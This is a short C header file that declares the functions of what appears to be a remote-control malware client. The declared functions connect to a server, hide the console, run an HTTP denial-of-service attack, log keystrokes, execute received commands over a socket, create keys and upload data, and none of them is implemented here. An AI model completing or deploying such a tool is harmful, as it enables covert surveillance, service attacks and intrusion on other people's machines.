#ifndef UTILS_H_INCLUDED
#define UTILS_H_INCLUDED
#include "utils.c"
//Function that create connection to the server
int create_conn(int sock, char *server_ip, int server_port);
//Funzione che converte un url in ip
void hostname_to_ip(char *address, char *ip);
//Function that hides the console
void stealth();

int create_key(char *path);

int test_key(void );
//Function to execute the HTTPDOS
void hdos_exe(char *address);

int get_keylog();

int exec_command(char *command, int sock);

void upload();

#endif // UTILS_H_INCLUDED
